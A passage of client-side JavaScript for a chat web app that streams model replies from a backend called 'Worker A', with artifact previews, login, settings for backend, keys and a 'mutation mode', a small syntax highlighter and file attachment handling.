    document.getElementById('artifact-lang').textContent  = art.lang  || 'text';

    const vBar  = document.getElementById('artifact-version-bar');
    const vLabel = document.getElementById('version-label');
    const vCount = document.getElementById('version-count');
    const nVersions = art.versions.length;
    vBar.style.display = nVersions > 1 ? '' : 'none';
    vLabel.textContent = 'v' + (art.currentVersion + 1);
    vCount.textContent = nVersions + ' version' + (nVersions > 1 ? 's' : '');

    ArtifactPanel.renderContent(art);
  },

  renderContent(art) {
    const ver  = art.versions[art.currentVersion];
    if (!ver) return;

    const content = ver.content || '';
    const lang    = art.lang || 'text';

    const activeTab = document.querySelector('.artifact-tab.active')?.dataset.tab || 'code';
    const container = document.getElementById('artifact-content');

    if (activeTab === 'preview' && (lang === 'html' || lang === 'jsx')) {
      container.innerHTML = '';
      const iframe = document.createElement('iframe');
      iframe.className = 'artifact-preview';
      iframe.sandbox   = 'allow-scripts allow-forms';
      container.appendChild(iframe);
      iframe.srcdoc = content;
    } else if (activeTab === 'preview' && lang === 'mermaid') {
      container.innerHTML = \`<div style="padding:20px;background:#fff;height:100%;display:flex;align-items:center;justify-content:center;font-size:12px;color:#333">[Mermaid preview — open in browser tool for rendering]</div>\`;
    } else {
      container.innerHTML = \`<div class="artifact-code-view"><code>\${ConvList.esc(content)}</code></div>\`;
    }
  },

  prevVersion() {
    const art = State.artifacts.get(State.activeArtifactId);
    if (!art) return;
    art.currentVersion = Math.max(0, art.currentVersion - 1);
    ArtifactPanel.render();
  },

  nextVersion() {
    const art = State.artifacts.get(State.activeArtifactId);
    if (!art) return;
    art.currentVersion = Math.min(art.versions.length - 1, art.currentVersion + 1);
    ArtifactPanel.render();
  },

  copyContent() {
    const art = State.artifacts.get(State.activeArtifactId);
    if (!art) return;
    const ver = art.versions[art.currentVersion];
    if (ver) {
      navigator.clipboard.writeText(ver.content).then(() => Toast.ok('Copied to clipboard')).catch(() => Toast.err('Copy failed'));
    }
  },

  openInWindow() {
    const art = State.artifacts.get(State.activeArtifactId);
    if (!art) return;
    const ver = art.versions[art.currentVersion];
    if (!ver) return;
    const w = window.open('', '_blank');
    if (art.lang === 'html' || art.lang === 'jsx') {
      w.document.write(ver.content);
    } else {
      w.document.write(\`<pre style="font-family:monospace;font-size:13px;background:#13131a;color:#d0d0e0;padding:20px;margin:0;min-height:100vh">\${ConvList.esc(ver.content)}</pre>\`);
    }
    w.document.close();
  },

  close() {
    State.activeArtifactId = null;
    document.getElementById('artifact-panel')?.classList.add('hidden');
  },

  switchTab(tab) {
    document.querySelectorAll('.artifact-tab').forEach(t => t.classList.toggle('active', t.dataset.tab === tab));
    const art = State.artifacts.get(State.activeArtifactId);
    if (art) ArtifactPanel.renderContent(art);
  },
};

// ================================================================
// MAIN APP CONTROLLER
// ================================================================

const App = {
  _authMode: 'login', // 'login' | 'signup'

  async init() {
    await initDB();
    await loadPersistedData();
    this._setupEventListeners();
    this._populateModelSelect();
    this._checkWorkerA();
    // Try to restore session
    const savedToken = localStorage.getItem('wb_token');
    const savedAccount = localStorage.getItem('wb_account');
    if (savedToken && savedAccount) {
      State.token   = savedToken;
      State.account = JSON.parse(savedAccount);
      this._showApp();
    } else {
      this._showAuth();
    }
  },

  _checkWorkerA() {
    const statusEl = document.getElementById('worker-a-status');
    const urlEl    = document.getElementById('worker-a-url');
    if (urlEl) urlEl.textContent = State.workerAUrl;
    fetch(State.workerAUrl + '/health').then(r => r.json()).then(d => {
      if (statusEl) {
        statusEl.textContent = d.status === 'ok' ? 'online ✓' : 'error';
        statusEl.className   = 'pill ' + (d.status === 'ok' ? 'pill-ok' : 'pill-err');
      }
    }).catch(() => {
      if (statusEl) {
        statusEl.textContent = 'offline ✗';
        statusEl.className   = 'pill pill-err';
      }
    });
  },

  _populateModelSelect() {
    const select = document.getElementById('model-select');
    if (!select) return;
    select.innerHTML = MODELS.map(m =>
      \`<option value="\${m.id}" \${m.id === State.config.model ? 'selected' : ''}>\${m.name}</option>\`
    ).join('');
  },

  async _showApp() {
    document.getElementById('auth-screen').style.display = 'none';
    document.getElementById('app').classList.remove('hidden');

    // Update user UI
    if (State.account) {
      const name = State.account.full_name || State.account.display_name || 'Operator';
      document.getElementById('user-name').textContent   = name;
      document.getElementById('user-avatar').textContent = name.slice(0, 2).toUpperCase();
      document.getElementById('user-plan').textContent   = State.account.has_claude_max ? 'MAX 5X' : 'PRO';
    }

    // Load quick actions
    try {
      const qa = await API.getQuickActions();
      State.quickActions = qa.quick_actions || [];
      this._renderQuickActions();
    } catch {}

    // Poll Worker A health
    this._startHealthPoll();

    // Load conversations from DB (already in State) + sync from Worker A
    ConvList.render();
    this._syncConversations();

    // Load settings from Worker A
    this._loadWorkerAConfig();
  },

  _showAuth() {
    document.getElementById('auth-screen').style.display = '';
    document.getElementById('app').classList.add('hidden');
  },

  _renderQuickActions() {
    const grid = document.getElementById('qa-grid');
    if (!grid) return;
    const actions = State.quickActions.slice(0, 6);
    if (!actions.length) {
      grid.style.display = 'none'; return;
    }
    grid.innerHTML = actions.map(qa =>
      \`<button class="qa-btn" onclick="App.sendQuickAction('\${btoa(encodeURIComponent(qa.prompt || ''))}')">
        <span>\${qa.icon || '⚡'}</span>\${ConvList.esc(qa.name)}
      </button>\`
    ).join('');
  },

  sendQuickAction(encodedPrompt) {
    let prompt;
    try { prompt = decodeURIComponent(atob(encodedPrompt)); }
    catch { prompt = ''; }
    if (prompt) {
      document.getElementById('msg-input').value = prompt;
      document.getElementById('msg-input').focus();
    }
  },

  async _syncConversations() {
    try {
      const convs = await API.listConvs(50);
      if (Array.isArray(convs)) {
        for (const c of convs) {
          if (!State.conversations.has(c.uuid)) {
            const local = { id: c.uuid, name: c.name || '', model: c.model, messages: [], created_at: c.created_at, updated_at: c.updated_at, starred: c.is_starred };
            State.conversations.set(c.uuid, local);
            persistConversation(local);
          }
        }
        ConvList.render();
      }
    } catch {}
  },

  async _loadWorkerAConfig() {
    try {
      const diag = await API.diag();
      State.workerAConfig = diag.config || {};
      const cfg = diag.config || {};
      // Update model selector
      if (cfg.default_model) {
        State.config.model = cfg.default_model;
        const sel = document.getElementById('model-select');
        if (sel) sel.value = cfg.default_model;
      }
      if (cfg.mutation_mode) {
        State.config.mutation_mode = cfg.mutation_mode;
        const badge = document.getElementById('mutation-badge');
        if (badge) badge.textContent = cfg.mutation_mode;
      }
      this._updateStatusPills(diag);
    } catch {}
  },

  _updateStatusPills(diag) {
    const wcPill = document.getElementById('wc-status-pill');
    const bePill = document.getElementById('backend-pill');
    if (wcPill) {
      const wc = diag.active_ws;
      wcPill.textContent = 'W-C ' + (wc ? '✓' : '✗');
      wcPill.className   = 'pill ' + (wc ? 'pill-ok' : 'pill-err');
    }
    if (bePill) {
      bePill.textContent = (diag.config?.backend || '—').slice(0, 12);
    }
  },

  _startHealthPoll() {
    setInterval(async () => {
      try {
        const h = await API.health();
        this._updateStatusPills({ active_ws: h.worker_c_connected, config: { backend: h.backend } });
      } catch {}
    }, 20000);
  },

  _setupEventListeners() {
    // Auth events
    document.getElementById('auth-login-btn')?.addEventListener('click', () => App.doAuth());
    document.getElementById('auth-toggle')?.addEventListener('click', () => App.toggleAuthMode());
    document.getElementById('auth-password')?.addEventListener('keydown', e => { if (e.key === 'Enter') App.doAuth(); });
    document.getElementById('auth-email')?.addEventListener('keydown', e => { if (e.key === 'Enter') document.getElementById('auth-password').focus(); });

    // Sidebar
    document.getElementById('toggle-sidebar')?.addEventListener('click', () => App.toggleSidebar());
    document.getElementById('new-conv-btn')?.addEventListener('click',  () => App.newConversation());
    document.getElementById('new-conv-btn2')?.addEventListener('click', () => App.newConversation());
    document.getElementById('logout-btn')?.addEventListener('click',    () => App.doLogout());
    document.getElementById('sidebar-search')?.addEventListener('input', () => ConvList.render());
    document.getElementById('star-filter-btn')?.addEventListener('click', () => {
      State.showStarredOnly = !State.showStarredOnly;
      document.getElementById('star-filter-btn').style.color = State.showStarredOnly ? 'var(--accent)' : '';
      ConvList.render();
    });

    // Main
    document.getElementById('search-btn')?.addEventListener('click',   () => App.openSearch());
    document.getElementById('settings-btn')?.addEventListener('click', () => App.openSettings());
    document.getElementById('send-btn')?.addEventListener('click',     () => App.send());
    document.getElementById('stop-btn')?.addEventListener('click',     () => App.stopStream());
    document.getElementById('clear-btn')?.addEventListener('click',    () => App.clearConv());
    document.getElementById('mutation-badge')?.addEventListener('click', () => App.cycleMutation());
    document.getElementById('thinking-btn')?.addEventListener('click', () => App.toggleThinking());
    document.getElementById('tools-btn')?.addEventListener('click',    () => App.toggleTools());
    document.getElementById('model-select')?.addEventListener('change', e => {
      State.config.model = e.target.value;
      localStorage.setItem('wb_model', e.target.value);
    });

    // Input
    document.getElementById('msg-input')?.addEventListener('keydown', e => {
      if (e.key === 'Enter' && !e.shiftKey) {
        e.preventDefault();
        App.send();
      }
    });
    document.getElementById('msg-input')?.addEventListener('input', () => {
      App.autoResizeInput();
      App.updateTokenHint();
    });

    // Artifact panel
    document.getElementById('close-artifact-btn')?.addEventListener('click',      () => ArtifactPanel.close());
    document.getElementById('copy-artifact-btn')?.addEventListener('click',       () => ArtifactPanel.copyContent());
    document.getElementById('new-window-artifact-btn')?.addEventListener('click', () => ArtifactPanel.openInWindow());
    document.getElementById('prev-version-btn')?.addEventListener('click',        () => ArtifactPanel.prevVersion());
    document.getElementById('next-version-btn')?.addEventListener('click',        () => ArtifactPanel.nextVersion());
    document.querySelectorAll('.artifact-tab').forEach(tab => {
      tab.addEventListener('click', () => ArtifactPanel.switchTab(tab.dataset.tab));
    });

    // Settings
    document.getElementById('save-settings-btn')?.addEventListener('click', () => App.saveSettings());
    document.querySelector('.settings-overlay')?.addEventListener('click', e => {
      if (e.target === e.currentTarget) App.closeSettings();
    });
    document.querySelector('.search-modal .modal-overlay')?.addEventListener?.('click', e => {
      if (e.target === e.currentTarget) App.closeSearch();
    });
    document.getElementById('search-modal')?.addEventListener('click', e => {
      if (e.target === e.currentTarget) App.closeSearch();
    });
    document.getElementById('search-input')?.addEventListener('input', () => App.doSearch());

    // Keyboard shortcuts
    document.addEventListener('keydown', e => {
      if (e.ctrlKey && e.key === 'k') { e.preventDefault(); App.openSearch(); }
      if (e.ctrlKey && e.shiftKey && e.key === 'O') { e.preventDefault(); App.newConversation(); }
      if (e.ctrlKey && e.key === ',') { e.preventDefault(); App.openSettings(); }
      if (e.key === 'Escape') { App.closeSearch(); App.closeSettings(); CtxMenu.close(); }
    });

    // Resize handles
    App._setupResizeHandle('resize-sidebar', 'sidebar', '--sidebar-w', 160, 380);
  },

  _setupResizeHandle(handleId, targetId, cssVar, min, max) {
    const handle = document.getElementById(handleId);
    const target = document.getElementById(targetId);
    if (!handle || !target) return;
    let dragging = false, startX = 0, startW = 0;
    handle.addEventListener('mousedown', e => {
      dragging = true;
      startX   = e.clientX;
      startW   = target.offsetWidth;
      document.body.style.cursor = 'col-resize';
      document.body.style.userSelect = 'none';
    });
    document.addEventListener('mousemove', e => {
      if (!dragging) return;
      const delta = e.clientX - startX;
      const newW  = Math.max(min, Math.min(max, startW + delta));
      target.style.width    = newW + 'px';
      target.style.minWidth = newW + 'px';
    });
    document.addEventListener('mouseup', () => {
      if (dragging) {
        dragging = false;
        document.body.style.cursor = '';
        document.body.style.userSelect = '';
      }
    });
  },

  toggleSidebar() {
    document.getElementById('sidebar').classList.toggle('collapsed');
  },

  toggleAuthMode() {
    App._authMode = App._authMode === 'login' ? 'signup' : 'login';
    document.getElementById('auth-login-btn').textContent = App._authMode === 'login' ? 'Sign in' : 'Create account';
    document.querySelector('.auth-title').textContent     = App._authMode === 'login' ? 'Sign in' : 'Create account';
    document.getElementById('auth-toggle').textContent   = App._authMode === 'login' ? 'Sign up' : 'Sign in';
    document.querySelector('.auth-switch').firstChild.textContent = App._authMode === 'login' ? "Don't have an account? " : 'Already have an account? ';
  },

  async doAuth() {
    const email = document.getElementById('auth-email').value.trim();
    const pass  = document.getElementById('auth-password').value;
    const errEl = document.getElementById('auth-error');
    errEl.style.display = 'none';

    if (!email || !pass) {
      errEl.textContent = 'Email and password are required';
      errEl.style.display = '';
      return;
    }

    try {
      const resp = App._authMode === 'login'
        ? await API.login(email, pass)
        : await API.signup(email, pass, email.split('@')[0]);

      State.token   = resp.token;
      State.account = resp.account;
      localStorage.setItem('wb_token',   resp.token);
      localStorage.setItem('wb_account', JSON.stringify(resp.account));
      App._showApp();
    } catch (e) {
      errEl.textContent = 'Auth failed: ' + e.message;
      errEl.style.display = '';
    }
  },

  async doLogout() {
    await API.logout();
    State.token   = null;
    State.account = null;
    localStorage.removeItem('wb_token');
    localStorage.removeItem('wb_account');
    App._showAuth();
  },

  newConversation() {
    State.currentConvId = null;
    State.isStreaming   = false;
    document.getElementById('messages').innerHTML = '';
    document.getElementById('messages').style.display = 'none';
    document.getElementById('empty-state').style.display = '';
    document.getElementById('conv-title').textContent = 'New Conversation';
    document.getElementById('msg-input').value = '';
    document.getElementById('msg-input').focus();
    ArtifactPanel.close();
    ConvList.render();
  },

  async loadConversation(id) {
    const local = State.conversations.get(id);
    State.currentConvId = id;
    document.getElementById('conv-title').textContent = local?.name || 'Untitled';
    ConvList.render();

    // Try to get full conversation from Worker A
    try {
      const remote = await API.getConv(id);
      const msgs = (remote.messages || []).map(m => ({
        uuid:       m.uuid,
        role:       m.role || (m.sender === 'human' ? 'user' : 'assistant'),
        content:    m.content,
        text:       m.text || (typeof m.content === 'string' ? m.content : (m.content || []).filter(b => b.type === 'text').map(b => b.text).join('\\n')),
        model:      m.model,
        created_at: m.created_at,
      }));

      const conv = State.conversations.get(id) || { id, name: remote.name || '', model: remote.model, created_at: remote.created_at, updated_at: remote.updated_at, starred: false };
      conv.messages = msgs;
      State.conversations.set(id, conv);
      persistConversation(conv);
      Chat.renderAll(conv);
    } catch {
      Chat.renderAll(local || { id, messages: [] });
    }
  },

  async send() {
    if (State.isStreaming) return;
    const input = document.getElementById('msg-input');
    const text  = input.value.trim();
    if (!text) return;

    input.value = '';
    App.autoResizeInput();

    const model   = document.getElementById('model-select')?.value || State.config.model;
    let   convId  = State.currentConvId;

    // Create conversation if needed
    if (!convId) {
      try {
        const remote = await API.createConv(model);
        convId = remote.uuid;
      } catch {
        convId = 'local_' + Date.now();
      }
      State.currentConvId = convId;
      const conv = { id: convId, name: text.slice(0, 60), model, messages: [], created_at: new Date().toISOString(), updated_at: new Date().toISOString(), starred: false };
      State.conversations.set(convId, conv);
      persistConversation(conv);
      ConvList.render();
      document.getElementById('conv-title').textContent = conv.name;
    }

    // Add human message to local state
    const humanMsg = {
      uuid:       'local_' + Date.now(),
      role:       'user',
      text,
      content:    [{ type: 'text', text }],
      model,
      created_at: new Date().toISOString(),
    };
    const conv = State.conversations.get(convId);
    if (conv) {
      conv.messages = conv.messages || [];
      conv.messages.push(humanMsg);
      conv.updated_at = new Date().toISOString();
      conv.name = conv.name || text.slice(0, 60);
    }

    // Render human message immediately
    const container = document.getElementById('messages');
    const empty     = document.getElementById('empty-state');
    container.style.display = '';
    empty.style.display     = 'none';
    container.appendChild(Chat.renderMessage(humanMsg));
    Chat.scrollToBottom();

    // Start streaming assistant response
    State.isStreaming = true;
    App._setStreamingUI(true);

    const { el, textEl, thinkingEl, toolEl } = Chat.appendStreamingMessage('assistant', model);

    let fullText    = '';
    let thinkingText = '';
    let toolName    = null;
    let toolId      = null;

    try {
      const resp = await API.completeV1(
        (conv?.messages || []).map(m => ({ role: m.role, content: Chat.getMessageText(m) })),
        model,
        {
          thinking: State.config.thinking_mode,
          tools:    State.config.tools_enabled ? App._getTools() : [],
        }
      );

      await SSE.consume(resp, {
        onText(chunk, acc) {
          fullText = acc;
          const cursor = textEl.querySelector('.cursor-blink');
          if (cursor) {
            textEl.insertBefore(document.createTextNode(chunk), cursor);
          } else {
            textEl.innerHTML = Markdown.render(acc) + '<span class="cursor-blink"></span>';
          }
          Chat.scrollToBottom();
        },
        onThinking(chunk, acc) {
          thinkingText = acc;
          thinkingEl.wrap.style.display = '';
          thinkingEl.header.textContent = 'Extended thinking · ' + acc.length + ' chars';
          thinkingEl.content.textContent = acc;
        },
        onToolUse(id, name) {
          toolName = name;
          toolId   = id;
          toolEl.style.display = '';
          toolEl.innerHTML = \`<div class="tool-header">Tool: \${ConvList.esc(name)}</div><div class="tool-input">Building input…</div>\`;
        },
        onToolInput(chunk, acc) {
          const inputDiv = toolEl.querySelector('.tool-input');
          if (inputDiv) inputDiv.textContent = acc;
        },
        onDone({ text, thinking, tool, stopReason }) {
          // Remove cursor
          const cursor = textEl.querySelector('.cursor-blink');
          cursor?.remove();

          // Finalize text display
          if (text) {
            const artifacts = Markdown.extractArtifacts(text);
            const displayText = text.replace(/\`\`\`[\\s\\S]*?\`\`\`/g, '');
            textEl.innerHTML = Markdown.render(displayText);
            for (const art of artifacts) {
              const artId  = 'art_' + convId + '_' + Date.now() + '_' + Math.random().toString(36).slice(2);
              const ref    = document.createElement('div');
              ref.className = 'artifact-ref';
              ref.innerHTML = \`<span class="art-icon">⬜</span> \${ConvList.esc(art.title)}\`;
              ref.onclick   = () => ArtifactPanel.open(artId, art.title, art.lang, btoa(encodeURIComponent(art.content)));
              textEl.appendChild(ref);
            }
          }

          // Store assistant message
          const assistantMsg = {
            uuid:    'asst_' + Date.now(),
            role:    'assistant',
            text,
            content: [
              ...(thinking ? [{ type: 'thinking', thinking }] : []),
              ...(tool ? [{ type: 'tool_use', id: toolId, name: tool.name, input: tool.input }] : []),
              { type: 'text', text },
            ].filter(b => b.text !== '' || b.type !== 'text'),
            model,
            created_at: new Date().toISOString(),
            stop_reason: stopReason,
          };

          const c = State.conversations.get(convId);
          if (c) {
            c.messages.push(assistantMsg);
            c.updated_at = new Date().toISOString();
            persistConversation(c);
          }
          el.classList.remove('streaming');
          State.isStreaming = false;
          App._setStreamingUI(false);
          Chat.scrollToBottom();
          ConvList.render();
        },
        onError(err) {
          textEl.innerHTML = \`<span class="red">Stream error: \${ConvList.esc(err.message)}</span>\`;
          el.classList.remove('streaming');
          State.isStreaming = false;
          App._setStreamingUI(false);
          Toast.err(err.message);
        },
      });
    } catch (e) {
      if (e.name !== 'AbortError') {
        textEl.innerHTML = \`<span class="red">Error: \${ConvList.esc(e.message)}</span>\`;
        Toast.err(e.message);
      }
      el.classList.remove('streaming');
      State.isStreaming = false;
      App._setStreamingUI(false);
    }
  },

  stopStream() {
    if (State.streamAbort) {
      State.streamAbort.abort();
      State.streamAbort = null;
    }
    State.isStreaming = false;
    App._setStreamingUI(false);
    // Remove cursor from last message
    document.querySelectorAll('.cursor-blink').forEach(c => c.remove());
    document.querySelectorAll('.streaming').forEach(el => el.classList.remove('streaming'));
  },

  _setStreamingUI(streaming) {
    const sendBtn = document.getElementById('send-btn');
    const stopBtn = document.getElementById('stop-btn');
    if (sendBtn) sendBtn.disabled = streaming;
    if (stopBtn) stopBtn.classList.toggle('hidden', !streaming);
  },

  clearConv() {
    const conv = State.conversations.get(State.currentConvId);
    if (!conv) return;
    if (!confirm('Clear all messages in this conversation?')) return;
    conv.messages = [];
    persistConversation(conv);
    Chat.renderAll(conv);
    Toast.info('Conversation cleared');
  },

  autoResizeInput() {
    const el = document.getElementById('msg-input');
    if (!el) return;
    el.style.height = 'auto';
    el.style.height = Math.min(200, el.scrollHeight) + 'px';
  },

  updateTokenHint() {
    const text = document.getElementById('msg-input')?.value || '';
    const est  = Math.ceil(text.length / 4);
    const hint = document.getElementById('token-hint');
    if (hint) hint.textContent = est > 0 ? '~' + est + ' tokens' : '';
  },

  cycleMutation() {
    const modes = ['strip_replace', 'prepend', 'append'];
    const cur   = modes.indexOf(State.config.mutation_mode);
    State.config.mutation_mode = modes[(cur + 1) % modes.length];
    localStorage.setItem('wb_mutation', State.config.mutation_mode);
    document.getElementById('mutation-badge').textContent = State.config.mutation_mode;
    // Push to Worker A
    API.saveConfig({ mutation_mode: State.config.mutation_mode }).catch(() => {});
  },

  toggleThinking() {
    State.config.thinking_mode = !State.config.thinking_mode;
    const btn = document.getElementById('thinking-btn');
    if (btn) btn.style.color = State.config.thinking_mode ? 'var(--purple)' : 'var(--text3)';
    Toast.info('Extended thinking: ' + (State.config.thinking_mode ? 'ON' : 'OFF'));
  },

  toggleTools() {
    State.config.tools_enabled = !State.config.tools_enabled;
    const btn = document.getElementById('tools-btn');
    if (btn) btn.style.color = State.config.tools_enabled ? 'var(--green)' : 'var(--text3)';
    Toast.info('Tools: ' + (State.config.tools_enabled ? 'ON' : 'OFF'));
  },

  _getTools() {
    return [{
      name: 'read_file',
      description: 'Read the contents of a file',
      input_schema: {
        type: 'object',
        properties: { path: { type: 'string', description: 'File path to read' } },
        required: ['path'],
      },
    }, {
      name: 'write_file',
      description: 'Write content to a file',
      input_schema: {
        type: 'object',
        properties: {
          path:    { type: 'string' },
          content: { type: 'string' },
        },
        required: ['path', 'content'],
      },
    }, {
      name: 'bash',
      description: 'Execute a bash command',
      input_schema: {
        type: 'object',
        properties: { command: { type: 'string' } },
        required: ['command'],
      },
    }];
  },

  openSearch() {
    document.getElementById('search-modal')?.classList.add('open');
    setTimeout(() => document.getElementById('search-input')?.focus(), 100);
  },

  closeSearch() {
    document.getElementById('search-modal')?.classList.remove('open');
  },

  doSearch() {
    const q = document.getElementById('search-input')?.value.toLowerCase().trim() || '';
    const container = document.getElementById('search-results');
    if (!q || !container) { container.innerHTML = ''; return; }

    const results = [];
    for (const conv of State.conversations.values()) {
      const matchName = (conv.name || '').toLowerCase().includes(q);
      const matchMsg  = (conv.messages || []).some(m => Chat.getMessageText(m).toLowerCase().includes(q));
      if (matchName || matchMsg) results.push(conv);
      if (results.length >= 20) break;
    }

    container.innerHTML = results.length
      ? results.map(c => \`<div class="search-result-item" onclick="App.loadConversation('\${c.id}');App.closeSearch()">
          <div class="search-result-name">\${ConvList.esc(c.name || 'Untitled')}</div>
          <div class="search-result-snippet">\${ConvList.esc(Chat.getMessageText((c.messages||[]).slice(-1)[0]).slice(0, 100))}</div>
        </div>\`).join('')
      : '<div class="dim" style="padding:12px;font-size:12px">No results</div>';
  },

  openSettings() {
    // Pre-populate fields
    const cfg = State.workerAConfig;
    document.getElementById('cfg-backend')?.value  && (document.getElementById('cfg-backend').value  = cfg.backend  || 'lm_studio');
    document.getElementById('cfg-auth-mode')?.value && (document.getElementById('cfg-auth-mode').value = cfg.auth_mode || 'no_key');
    document.getElementById('cfg-model')?.value    && (document.getElementById('cfg-model').value    = cfg.default_model || State.config.model);
    document.getElementById('cfg-mutation')?.value && (document.getElementById('cfg-mutation').value = cfg.mutation_mode || 'strip_replace');
    document.getElementById('cfg-worker-a-url').value = State.workerAUrl;
    document.getElementById('settings-overlay')?.classList.add('open');
  },

  closeSettings() {
    document.getElementById('settings-overlay')?.classList.remove('open');
  },

  async saveSettings() {
    const backend      = document.getElementById('cfg-backend')?.value;
    const authMode     = document.getElementById('cfg-auth-mode')?.value;
    const model        = document.getElementById('cfg-model')?.value;
    const mutation     = document.getElementById('cfg-mutation')?.value;
    const apiKey       = document.getElementById('cfg-api-key')?.value;
    const oauthToken   = document.getElementById('cfg-oauth-token')?.value;
    const systemPrompt = document.getElementById('cfg-system-prompt')?.value;
    const newWorkerA   = document.getElementById('cfg-worker-a-url')?.value;

    if (newWorkerA && newWorkerA !== State.workerAUrl) {
      State.workerAUrl = newWorkerA;
      localStorage.setItem('wb_worker_a_url', newWorkerA);
    }

    const cfgUpdate = {
      backend,
      auth_mode:               authMode,
      default_model:           model,
      mutation_mode:           mutation,
      ...(apiKey        ? { api_key:     apiKey }       : {}),
      ...(oauthToken    ? { oauth_token: oauthToken }   : {}),
      ...(systemPrompt !== undefined ? { system_prompt_override: systemPrompt } : {}),
    };

    try {
      await API.saveConfig(cfgUpdate);
      State.config.model         = model;
      State.config.mutation_mode = mutation;
      localStorage.setItem('wb_model',    model);
      localStorage.setItem('wb_mutation', mutation);
      const sel = document.getElementById('model-select');
      if (sel) sel.value = model;
      const badge = document.getElementById('mutation-badge');
      if (badge) badge.textContent = mutation;
      Toast.ok('Settings saved');
      App.closeSettings();
      App._loadWorkerAConfig();
    } catch (e) {
      Toast.err('Failed to save: ' + e.message);
    }
  },
};

// ================================================================
// SYNTAX HIGHLIGHTER — minimal embedded, no dependencies
// ================================================================

const Syntax = {
  // Token types and their CSS classes
  _rules: [
    // Strings
    { re: /(["'\`])(?:(?!\\1)[^\\\\]|\\\\[\\s\\S])*?\\1/g,      cls: 'str' },
    // Template literals
    { re: /\`[\\s\\S]*?\`/g,                                cls: 'str' },
    // Comments
    { re: /\\/\\/[^\\n]*/g,                                cls: 'cmt' },
    { re: /\\/\\*[\\s\\S]*?\\*\\//g,                          cls: 'cmt' },
    { re: /#[^\\n]*/g,                                   cls: 'cmt' },  // Python/bash
    // Keywords
    { re: /\\b(const|let|var|function|async|await|return|if|else|for|while|do|switch|case|break|continue|class|extends|import|export|default|from|of|in|new|this|super|try|catch|finally|throw|typeof|instanceof|void|delete|null|undefined|true|false)\\b/g, cls: 'kw' },
    // Python keywords
    { re: /\\b(def|lambda|pass|raise|except|with|as|yield|global|nonlocal|and|or|not|is|elif|assert|del|print)\\b/g, cls: 'kw' },
    // Numbers
    { re: /\\b\\d+\\.?\\d*(?:[eE][+-]?\\d+)?\\b/g,           cls: 'num' },
    // Hex
    { re: /0x[0-9a-fA-F]+\\b/g,                          cls: 'num' },
    // Built-ins / types
    { re: /\\b(Array|Object|String|Number|Boolean|Promise|Map|Set|WeakMap|WeakSet|Symbol|Proxy|Reflect|Math|Date|JSON|console|process|window|document|require|module|exports|__dirname|__filename)\\b/g, cls: 'builtin' },
    // Decorators
    { re: /@[\\w.]+/g,                                   cls: 'decorator' },
    // Function calls
    { re: /\\b([a-zA-Z_$][\\w$]*)\\s*(?=\\()/g,            cls: 'fn' },
    // Properties
    { re: /\\.([a-zA-Z_$][\\w$]*)/g,                     cls: 'prop' },
    // HTML tags
    { re: /<\\/?[a-zA-Z][a-zA-Z0-9]*(?:\\s[^>]*)?\\/?>/g, cls: 'tag' },
    // CSS selectors and properties
    { re: /[.#][\\w-]+/g,                                cls: 'selector' },
  ],

  _tokenize(code, lang) {
    if (!code) return '';
    // Escape HTML first
    let result = code.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');

    // Apply simple token-based coloring
    // This is intentionally minimal — not a full parser
    const tokenMap = new Map();
    let   tokenIdx = 0;

    const tokenize = (re, cls) => {
      result = result.replace(re, (match) => {
        const key = \`\\x00TOKEN\${tokenIdx++}\\x00\`;
        tokenMap.set(key, \`<span class="hl-\${cls}">\${match}</span>\`);
        return key;
      });
    };

    // Keywords first
    result = result.replace(/\\b(const|let|var|function|async|await|return|if|else|for|while|do|switch|case|break|continue|class|extends|import|export|default|from|of|in|new|this|super|try|catch|finally|throw|typeof|instanceof|void|delete|null|undefined|true|false|def|lambda|pass|raise|except|with|as|yield|global|nonlocal|and|or|not|is|elif|assert)\\b/g,
      m => \`<span class="hl-kw">\${m}</span>\`);

    // Strings (simplified — doesn't handle nested)
    result = result.replace(/(["'])(?:(?!\\1)[^\\\\]|\\\\.)*?\\1/g,
      m => \`<span class="hl-str">\${m}</span>\`);

    // Comments
    result = result.replace(/\\/\\/[^\\n]*/g,   m => \`<span class="hl-cmt">\${m}</span>\`);
    result = result.replace(/\\/\\*[\\s\\S]*?\\*\\//g, m => \`<span class="hl-cmt">\${m}</span>\`);
    result = result.replace(/(^|\\n)(#[^\\n]*)/g, (_, pre, cmt) => pre + \`<span class="hl-cmt">\${cmt}</span>\`);

    // Numbers
    result = result.replace(/\\b(\\d+\\.?\\d*(?:[eE][+-]?\\d+)?)\\b/g,
      m => \`<span class="hl-num">\${m}</span>\`);

    // Function calls
    result = result.replace(/\\b([a-zA-Z_$][\\w$]*)\\s*(?=&lt;|[(])/g,
      m => \`<span class="hl-fn">\${m}</span>\`);

    return result;
  },

  // Apply to all pre/code elements in a container
  highlight(container) {
    container.querySelectorAll('pre code, pre').forEach(el => {
      if (el._highlighted) return;
      const lang = [...el.classList].find(c => c.startsWith('lang-'))?.slice(5) || 'text';
      el.innerHTML = Syntax._tokenize(el.textContent, lang);
      el._highlighted = true;
    });
  },
};

// CSS for syntax highlighting (injected once)
(function injectSyntaxCSS() {
  const style = document.createElement('style');
  style.textContent = \`
    .hl-kw{color:#e07a5f;font-weight:700;}
    .hl-str{color:#81b29a;}
    .hl-cmt{color:#6b7280;font-style:italic;}
    .hl-num{color:#f2cc8f;}
    .hl-fn{color:#a0c4ff;}
    .hl-builtin{color:#c084fc;}
    .hl-decorator{color:#e8903a;}
    .hl-prop{color:#94a3b8;}
    .hl-tag{color:#e07a5f;}
    .hl-selector{color:#81b29a;}
  \`;
  document.head.appendChild(style);
})();

// ================================================================
// FILE ATTACHMENT HANDLER
// ================================================================

const FileHandler = {
  _files: [],  // [{ name, size, type, dataUrl, uuid }]

  async selectFiles() {
    return new Promise((resolve) => {
      const input = document.createElement('input');
      input.type     = 'file';
      input.multiple = true;
      input.accept   = '.txt,.md,.pdf,.png,.jpg,.jpeg,.gif,.webp,.js,.ts,.py,.rb,.go,.rs,.java,.c,.cpp,.cs,.html,.css,.json,.yaml,.yml,.sh,.csv,.xml';
      input.onchange = async () => {
        const files = await FileHandler._processFiles([...input.files]);
        resolve(files);
      };
      input.click();
    });
  },

  async _processFiles(fileList) {
    const results = [];
    for (const f of fileList.slice(0, 5)) { // max 5 files
      const dataUrl = await FileHandler._readFile(f);
      results.push({
        uuid:     'file_' + Date.now() + '_' + Math.random().toString(36).slice(2),
        name:     f.name,
        size:     f.size,
        type:     f.type || 'application/octet-stream',
        dataUrl,
        uploaded: false,
      });
    }
    return results;
  },

  _readFile(file) {
    return new Promise((resolve, reject) => {
